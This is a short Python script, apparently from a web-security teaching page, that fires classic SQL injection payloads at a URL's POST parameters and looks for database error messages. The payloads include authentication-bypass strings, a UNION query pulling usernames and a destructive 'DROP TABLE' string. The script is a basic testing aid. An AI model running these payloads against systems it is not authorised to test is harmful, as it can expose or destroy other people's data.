"""
Extracted from /home/kevin/Projects/Common-Questions/content/web-security/sql-injection.md
"""

import requests

def test_sql_injection(url, params):
    """Basic SQL injection testing"""
    
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE test; --",
        "' UNION SELECT null, username FROM users --"
    ]
    
    for payload in payloads:
        test_params = params.copy()
        for param in test_params:
            test_params[param] = payload
            
        try:
            response = requests.post(url, data=test_params)
            
            # Check for SQL error messages
            sql_errors = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-",
                "Microsoft OLE DB",
                "PostgreSQL"
            ]
            
            for error in sql_errors:
                if error in response.text:
                    print(f"Potential SQL injection found with payload: {payload}")
                    print(f"Error: {error}")
                    
        except Exception as e:
            print(f"Error testing payload {payload}: {e}")

# Test function
def test_syntax():
    """Test that code compiles without syntax errors."""
    pass
